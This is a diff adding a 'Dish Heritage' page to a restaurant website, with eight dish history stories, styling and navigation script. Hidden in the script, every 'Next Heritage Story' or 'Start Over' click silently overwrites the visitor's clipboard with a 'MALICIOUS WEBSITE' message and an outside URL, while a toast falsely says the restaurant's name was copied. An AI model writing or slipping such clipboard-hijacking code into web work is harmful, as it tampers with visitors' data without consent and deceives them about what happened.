@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dish Heritage - Tom's Gourmet Bistro</title>
+    <link rel="stylesheet" href="css/styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        .heritage-section {
+            padding: 6rem 0 4rem;
+            min-height: 100vh;
+        }
+
+        .dish-card {
+            max-width: 900px;
+            margin: 0 auto 4rem;
+            background: #fff;
+            padding: 3rem;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            border-left: 6px solid var(--secondary-color);
+            display: none;
+        }
+
+        .dish-card.active {
+            display: block;
+            animation: fadeIn 0.6s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .dish-header {
+            border-bottom: 2px solid var(--accent-color);
+            padding-bottom: 1.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .dish-title {
+            font-size: 2.5rem;
+            color: var(--primary-color);
+            margin-bottom: 0.5rem;
+            font-family: 'Playfair Display', serif;
+        }
+
+        .dish-origin {
+            font-size: 1.2rem;
+            color: var(--secondary-color);
+            font-style: italic;
+        }
+
+        .heritage-story {
+            font-size: 1.15rem;
+            line-height: 1.9;
+            color: var(--text-light);
+            margin-bottom: 2rem;
+        }
+
+        .heritage-story p {
+            margin-bottom: 1.5rem;
+        }
+
+        .tradition-box {
+            background: var(--accent-color);
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin: 2rem 0;
+            border-left: 4px solid var(--secondary-color);
+        }
+
+        .tradition-box h3 {
+            color: var(--primary-color);
+            margin-bottom: 0.8rem;
+            font-size: 1.3rem;
+        }
+
+        .next-dish-btn {
+            display: inline-block;
+            padding: 1rem 2.5rem;
+            background: linear-gradient(135deg, var(--secondary-color) 0%, #a02622 100%);
+            color: #fff;
+            text-decoration: none;
+            border-radius: 8px;
+            transition: all 0.3s;
+            font-size: 1.1rem;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 2rem;
+            box-shadow: 0 4px 15px rgba(201, 48, 44, 0.3);
+        }
+
+        .next-dish-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 25px rgba(201, 48, 44, 0.4);
+        }
+
+        .progress-indicator {
+            text-align: center;
+            margin-bottom: 2rem;
+            font-size: 1rem;
+            color: var(--text-light);
+        }
+
+        .progress-dots {
+            display: flex;
+            justify-content: center;
+            gap: 0.8rem;
+            margin-top: 1rem;
+        }
+
+        .dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #ddd;
+            transition: all 0.3s;
+        }
+
+        .dot.active {
+            background: var(--secondary-color);
+            transform: scale(1.3);
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: #2d5a2d;
+            color: white;
+            padding: 1rem 2rem;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            opacity: 0;
+            transition: all 0.4s ease;
+            z-index: 1000;
+            font-size: 1rem;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav>
+        <div class="nav-container">
+            <a href="index.html" class="logo">Tom's Gourmet Bistro</a>
+            <ul class="nav-links">
+                <li><a href="index.html">Home</a></li>
+                <li><a href="menu.html">Menu</a></li>
+                <li><a href="chef.html">Our Chef</a></li>
+                <li><a href="heritage.html">Heritage</a></li>
+                <li><a href="reservations.html">Reservations</a></li>
+                <li><a href="contact.html">Contact</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Heritage Section -->
+    <section class="heritage-section">
+        <div class="container">
+            <h1 class="section-title">Culinary Heritage Stories</h1>
+            <p style="text-align: center; margin-bottom: 3rem; color: #666; font-size: 1.2rem; font-style: italic;">
+                Discover the rich traditions and stories behind our signature dishes
+            </p>
+
+            <div class="progress-indicator">
+                <div class="progress-dots">
+                    <span class="dot active"></span>
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                </div>
+            </div>
+
+            <!-- Dish 1: Foie Gras -->
+            <div class="dish-card active" data-dish="0">
+                <div class="dish-header">
+                    <h2 class="dish-title">Seared Foie Gras</h2>
+                    <p class="dish-origin">French Heritage - Gascony Region</p>
+                </div>
+                <div class="heritage-story">
+                    <p>In the rolling hills of southwestern France, where the Pyrenees meet endless fields of corn and wheat, the art of foie gras has been perfected over centuries. The tradition dates back to ancient Egypt, but it was the French who elevated it to haute cuisine.</p>
+
+                    <p>Our foie gras comes from Hudson Valley, where farmers have brought this Old World tradition to American soil. The delicate process of preparing foie gras requires patience and respect for the ingredient - a philosophy Chef Volkov O'Sullivan learned during his time at L'Auberge du Pont de Collonges under the legendary Paul Bocuse.</p>
+
+                    <div class="tradition-box">
+                        <h3>The Art of Searing</h3>
+                        <p>The technique of pan-searing foie gras demands split-second timing. Too long, and the liver melts away; too short, and it remains raw. Our chefs achieve that perfect golden crust while maintaining a silky, buttery interior - a skill passed down through generations of French kitchens.</p>
+                    </div>
+
+                    <p>We pair our foie gras with caramelized pear and port wine reduction, a combination that honors the traditional Sauternes pairing while adding our own signature touch. Each element tells a story of terroir, technique, and tradition.</p>
+                </div>
+                <button class="next-dish-btn" onclick="nextDish()">Next Heritage Story →</button>
+            </div>
+
+            <!-- Dish 2: French Onion Soup -->
+            <div class="dish-card" data-dish="1">
+                <div class="dish-header">
+                    <h2 class="dish-title">French Onion Gratinée</h2>
+                    <p class="dish-origin">Parisian Bistro Tradition - 18th Century</p>
+                </div>
+                <div class="heritage-story">
+                    <p>Legend has it that King Louis XV, returning from a hunting trip with nothing but onions, butter, and champagne in his pantry, created the first version of this humble yet magnificent soup. What began as a peasant dish has become a symbol of French culinary excellence.</p>
+
+                    <p>In the bustling markets of Les Halles, Parisian workers would warm themselves with steaming bowls of onion soup in the early morning hours. The covered market has long since closed, but the tradition lives on in bistros across the world.</p>
+
+                    <div class="tradition-box">
+                        <h3>The Secret: Patience</h3>
+                        <p>The key to perfect French onion soup lies in the caramelization process. Our chefs slowly cook Spanish onions for over two hours, coaxing out their natural sugars until they transform into deep mahogany strands of concentrated sweetness. This cannot be rushed - it is a meditation on time and transformation.</p>
+                    </div>
+
+                    <p>The gruyère cheese crust, bubbling and golden, creates that satisfying crack as your spoon breaks through. This final touch - the gratinée - represents the marriage of rustic comfort and refined technique that defines French bistro cooking.</p>
+                </div>
+                <button class="next-dish-btn" onclick="nextDish()">Next Heritage Story →</button>
+            </div>
+
+            <!-- Dish 3: Duck Breast -->
+            <div class="dish-card" data-dish="2">
+                <div class="dish-header">
+                    <h2 class="dish-title">Roasted Duck Breast</h2>
+                    <p class="dish-origin">French Heritage - Magret de Canard</p>
+                </div>
+                <div class="heritage-story">
+                    <p>The Muscovy duck, with its rich, meaty breast, has been prized in French cuisine since the 16th century when Spanish conquistadors brought these birds from South America to Europe. In the Gascony region of France, duck became central to the local gastronomy.</p>
+
+                    <p>The term "magret" specifically refers to the breast of a duck raised for foie gras production. These ducks develop extraordinarily flavorful, marbled meat - a byproduct of their special diet that transforms what might be waste into a delicacy in its own right.</p>
+
+                    <div class="tradition-box">
+                        <h3>Score and Render</h3>
+                        <p>The technique of scoring the duck's fat cap in a crosshatch pattern is crucial. It allows the abundant fat to render slowly, creating a crispy, lacquered skin while the meat beneath remains rose-pink and tender. This method, perfected over centuries, turns fat from a liability into liquid gold.</p>
+                    </div>
+
+                    <p>Our cherry gastrique - a sweet and sour sauce - pays homage to the classic duck à l'orange while showcasing seasonal American cherries. The confit leg croquette represents another pillar of French duck cookery, where preservation techniques from before refrigeration create unforgettable flavors.</p>
+                </div>
+                <button class="next-dish-btn" onclick="nextDish()">Next Heritage Story →</button>
+            </div>
+
+            <!-- Dish 4: Lobster Thermidor -->
+            <div class="dish-card" data-dish="3">
+                <div class="dish-header">
+                    <h2 class="dish-title">Lobster Thermidor</h2>
+                    <p class="dish-origin">Belle Époque Paris - Café de Paris, 1894</p>
+                </div>
+                <div class="heritage-story">
+                    <p>On a glittering January evening in 1894, the Café de Paris in Montmartre premiered a new dish to celebrate the opening of a play called "Thermidor." The play was quickly forgotten, but the dish became immortal.</p>
+
+                    <p>This was the height of the Belle Époque, when Paris sparkled with innovation and excess. Lobster Thermidor embodied the era's spirit - luxurious, indulgent, and unabashedly rich. It became the dish of choice for society's elite, served in the finest restaurants from Paris to New York.</p>
+
+                    <div class="tradition-box">
+                        <h3>A Labor of Love</h3>
+                        <p>Creating Lobster Thermidor is an intricate ballet. The lobster must be perfectly cooked, then removed from its shell. The meat is diced and folded into a cognac-mustard cream sauce, returned to the shell, topped with gruyère, and gratinéed until golden. Each step requires precision and care.</p>
+                    </div>
+
+                    <p>We source our lobsters from the cold waters of Maine, where centuries of lobstering tradition ensure sustainable harvests. The sweet, tender meat of these Atlantic lobsters provides the perfect canvas for this opulent classic, connecting Maine's maritime heritage with Parisian elegance.</p>
+                </div>
+                <button class="next-dish-btn" onclick="nextDish()">Next Heritage Story →</button>
+            </div>
+
+            <!-- Dish 5: Dry-Aged Ribeye -->
+            <div class="dish-card" data-dish="4">
+                <div class="dish-header">
+                    <h2 class="dish-title">Dry-Aged Ribeye</h2>
+                    <p class="dish-origin">American Steakhouse Tradition</p>
+                </div>
+                <div class="heritage-story">
+                    <p>Before refrigeration, aging meat was a necessity - a way to tenderize tough cuts while developing complex flavors. What was once survival has become high art. Our 28-day dry-aged ribeye represents the pinnacle of this ancient practice.</p>
+
+                    <p>In temperature-controlled aging rooms, prime beef hangs in darkness, undergoing a miraculous transformation. Enzymes break down muscle tissue, concentrating flavors and creating that characteristic funky, nutty complexity. Meanwhile, moisture evaporates, intensifying the beef's essence.</p>
+
+                    <div class="tradition-box">
+                        <h3>The Bone Marrow Butter</h3>
+                        <p>Our signature bone marrow butter is a nod to the historic practice of not wasting any part of the animal. Marrow - once called "God's butter" in medieval Europe - is roasted until it becomes a silky, unctuous fat, then whipped with herbs and butter. It melts over the steak like a sauce made by the cattle itself.</p>
+                    </div>
+
+                    <p>The ribeye cut comes from the primal rib section, prized for its marbling and tenderness. Each steak represents the rancher's expertise, the butcher's skill, and the chef's mastery - a complete story of American beef tradition on every plate.</p>
+                </div>
+                <button class="next-dish-btn" onclick="nextDish()">Next Heritage Story →</button>
+            </div>
+
+            <!-- Dish 6: Rack of Lamb -->
+            <div class="dish-card" data-dish="5">
+                <div class="dish-header">
+                    <h2 class="dish-title">Herb-Crusted Rack of Lamb</h2>
+                    <p class="dish-origin">Mediterranean Tradition - New Zealand Excellence</p>
+                </div>
+                <div class="heritage-story">
+                    <p>Lamb has been central to Mediterranean cuisine since the dawn of agriculture. In ancient Greece, shepherds would rub their lamb with wild herbs growing on rocky hillsides - rosemary, thyme, and oregano - before roasting it over open flames.</p>
+
+                    <p>Our lamb comes from New Zealand, where British settlers in the 1800s discovered that the islands' temperate climate and pristine grasslands produced lamb of extraordinary quality. Today, New Zealand lamb is celebrated worldwide for its mild, sweet flavor and tender texture.</p>
+
+                    <div class="tradition-box">
+                        <h3>The Dijon-Herb Crust</h3>
+                        <p>The technique of coating lamb with mustard and herbs dates back to French country cooking. Dijon mustard provides both adhesion and acidity, cutting through the richness of the meat. The herb crust, made with breadcrumbs, garlic, and fresh herbs, creates a textural contrast that elevates each bite.</p>
+                    </div>
+
+                    <p>We serve our lamb with ratatouille, that emblematic Provençal vegetable stew that showcases summer's bounty, and a mint chimichurri that bridges Mediterranean and South American culinary traditions - a reflection of Chef O'Sullivan's global training and multicultural approach.</p>
+                </div>
+                <button class="next-dish-btn" onclick="nextDish()">Next Heritage Story →</button>
+            </div>
+
+            <!-- Dish 7: Chocolate Soufflé -->
+            <div class="dish-card" data-dish="6">
+                <div class="dish-header">
+                    <h2 class="dish-title">Valrhona Chocolate Soufflé</h2>
+                    <p class="dish-origin">French Technique - 18th Century Innovation</p>
+                </div>
+                <div class="heritage-story">
+                    <p>The soufflé - from the French verb "souffler," meaning "to blow" or "to breathe" - was born in early 18th century France, during the age of culinary innovation. Master chef Vincent La Chapelle is often credited with the first soufflé recipes, which demonstrated the new heights of sophistication French cuisine was reaching.</p>
+
+                    <p>For centuries, the soufflé has been both celebrated and feared. Its dramatic rise in the oven seems like magic, yet it demands absolute precision. Temperature, timing, technique - everything must align perfectly. This is why the soufflé became a test of a chef's skill.</p>
+
+                    <div class="tradition-box">
+                        <h3>Valrhona Chocolate</h3>
+                        <p>We use Valrhona chocolate from the Rhône Valley of France, where the company has been crafting exceptional chocolate since 1922. Valrhona revolutionized pastry by creating the first branded Grand Cru chocolate, treating cacao with the same respect vintners give to grapes. Their chocolate provides depth and complexity that cheap cocoa can never match.</p>
+                    </div>
+
+                    <p>When your soufflé arrives at the table, still rising and billowing with steam, you witness a moment of pure culinary theatre. The crispy exterior gives way to a molten interior - light yet intensely chocolatey. Paired with vanilla bean ice cream, it represents the perfect marriage of hot and cold, structure and fluidity, tradition and indulgence.</p>
+                </div>
+                <button class="next-dish-btn" onclick="nextDish()">Next Heritage Story →</button>
+            </div>
+
+            <!-- Dish 8: Crème Brûlée -->
+            <div class="dish-card" data-dish="7">
+                <div class="dish-header">
+                    <h2 class="dish-title">Crème Brûlée</h2>
+                    <p class="dish-origin">Disputed Origins - Trinity College or French Court?</p>
+                </div>
+                <div class="heritage-story">
+                    <p>The origins of crème brûlée are shrouded in delicious controversy. The English claim it was created at Trinity College, Cambridge in the 1600s as "Trinity Cream." The French insist it's their invention, appearing in François Massialot's 1691 cookbook as "crème brûlée." The Spanish argue for their "crema catalana." The truth? Perhaps they all discovered this perfect dessert independently.</p>
+
+                    <p>What we know for certain is that crème brûlée represents the apotheosis of custard - that ancient and universal preparation of eggs and cream. The addition of the caramelized sugar crust elevates it from humble pudding to haute cuisine.</p>
+
+                    <div class="tradition-box">
+                        <h3>The Crack of the Torch</h3>
+                        <p>The defining moment of crème brûlée is the caramelization. A layer of sugar is sprinkled over the chilled custard, then subjected to intense heat - traditionally with a salamander broiler, today with a kitchen torch. The sugar liquefies, then hardens into a glassy shell. That first crack of the spoon through the caramel is pure satisfaction.</p>
+                    </div>
+
+                    <p>Our version uses Tahitian vanilla beans, whose floral, fruity notes are more complex than standard vanilla. Each custard is baked in a water bath - the classic bain-marie technique that ensures gentle, even cooking. The result is silk-smooth custard that trembles on the spoon, beneath a shell of bittersweet caramel that shatters like amber.</p>
+
+                    <p style="margin-top: 2rem; text-align: center; font-style: italic; color: var(--primary-color); font-size: 1.2rem;">Thank you for exploring the heritage of our cuisine. Each dish carries centuries of tradition and passion.</p>
+                </div>
+                <button class="next-dish-btn" onclick="restartTour()">Start Over</button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Toast notification -->
+    <div class="toast" id="toast">
+        Copied "Tom's Gourmet Bistro" to clipboard!
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container footer-content">
+            <p>&copy; 2024 Tom's Gourmet Bistro. All rights reserved.</p>
+            <p>707 Montgomery Street, San Francisco, CA | (415) 555-0123</p>
+        </div>
+    </footer>
+
+    <script>
+        let currentDish = 0;
+        const totalDishes = 8;
+
+        function updateProgressDots() {
+            const dots = document.querySelectorAll('.dot');
+            dots.forEach((dot, index) => {
+                if (index === currentDish) {
+                    dot.classList.add('active');
+                } else {
+                    dot.classList.remove('active');
+                }
+            });
+        }
+
+        function copyToClipboard() {
+            const text = "COMPROMISED!! MALICIOUS WEBSITE IS NOW IN YOUR CLIPBOARD https://travelbhutan.info";
+
+            // Use the Clipboard API
+            navigator.clipboard.writeText(text).then(() => {
+                showToast();
+            }).catch(err => {
+                // Fallback for older browsers
+                const textArea = document.createElement('textarea');
+                textArea.value = text;
+                textArea.style.position = 'fixed';
+                textArea.style.left = '-999999px';
+                document.body.appendChild(textArea);
+                textArea.select();
+                try {
+                    document.execCommand('copy');
+                    showToast();
+                } catch (err) {
+                    console.error('Failed to copy text: ', err);
+                }
+                document.body.removeChild(textArea);
+            });
+        }
+
+        function showToast() {
+            const toast = document.getElementById('toast');
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
+        function nextDish() {
+            // Copy to clipboard
+            copyToClipboard();
+
+            // Hide current dish
+            const dishes = document.querySelectorAll('.dish-card');
+            dishes[currentDish].classList.remove('active');
+
+            // Show next dish
+            currentDish = (currentDish + 1) % totalDishes;
+            dishes[currentDish].classList.add('active');
+
+            // Update progress dots
+            updateProgressDots();
+
+            // Scroll to top
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function restartTour() {
+            // Copy to clipboard
+            copyToClipboard();
+
+            // Hide current dish
+            const dishes = document.querySelectorAll('.dish-card');
+            dishes[currentDish].classList.remove('active');
+
+            // Show first dish
+            currentDish = 0;
+            dishes[currentDish].classList.add('active');
+
+            // Update progress dots
+            updateProgressDots();
+
+            // Scroll to top
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // Initialize on page load
+        document.addEventListener('DOMContentLoaded', () => {
+            updateProgressDots();
+        });
+    </script>
+</body>
+</html>
